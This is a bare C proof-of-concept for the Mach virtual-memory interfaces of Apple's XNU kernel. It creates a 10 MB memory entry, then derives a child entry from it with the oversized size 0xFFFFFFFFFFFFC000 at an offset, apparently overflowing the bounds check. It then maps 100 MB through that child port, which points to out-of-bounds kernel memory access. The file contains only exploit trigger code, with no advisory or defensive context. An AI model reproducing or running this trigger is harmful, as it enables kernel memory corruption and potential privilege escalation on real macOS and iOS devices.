#define KB 1024
#define MB KB*KB
#define GB KB*KB*KB
void poc()
{
    vm_size_t root_entry_sz = 10*MB;
    mach_port_t root_entry = 0;

    int access = MAP_MEM_WCOMB;
    int permission = VM_PROT_READ | VM_PROT_WRITE;
    vm_prot_t prot = (access<<24) | permission;
    int kr = 0;
    kr = mach_memory_object_memory_entry(mach_host_self(), 1, root_entry_sz,prot, 0, &root_entry);
    printf("root_entry = %d\n", root_entry);

    uint64_t first_mapped_addr = 0;
    kr = mach_vm_map(mach_task_self(),
        &first_mapped_addr,
        10*MB,
        0,              /* mask */
        VM_FLAGS_ANYWHERE,
        root_entry,
        0,              /* offset */
        0,              /* copy */
        VM_PROT_READ | VM_PROT_WRITE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);

    printf("first_mapped_addr = 0x%llx\n", first_mapped_addr);
    strcpy((char*)first_mapped_addr, "init_values");
    printf("0x%llx: %s\n", first_mapped_addr, (char*)first_mapped_addr);

    uint64_t shmem_sz = 0xFFFFFFFFFFFFC000;
    uint64_t offset = 0x8000;
    mach_port_t child_port = MACH_PORT_NULL;
    kr = mach_make_memory_entry_64(mach_task_self(),
                                   &shmem_sz,
                                   offset,                            /* offset */
        (VM_PROT_READ | VM_PROT_WRITE),
        &child_port,
        root_entry);
    printf("child_port = %d\n", child_port);

    uint64_t mapped_addr_from_child_port = 0;
    kr = mach_vm_map(mach_task_self(),
        &mapped_addr_from_child_port,
        100*MB,
        0,              /* mask */
        VM_FLAGS_ANYWHERE,
        child_port,
        0,              /* offset */
        0,              /* copy */
        VM_PROT_READ |VM_PROT_WRITE,
        VM_PROT_READ | VM_PROT_WRITE,
        VM_INHERIT_DEFAULT);
    printf("mapped_addr_from_child_port = 0x%llx\n", mapped_addr_from_child_port);
}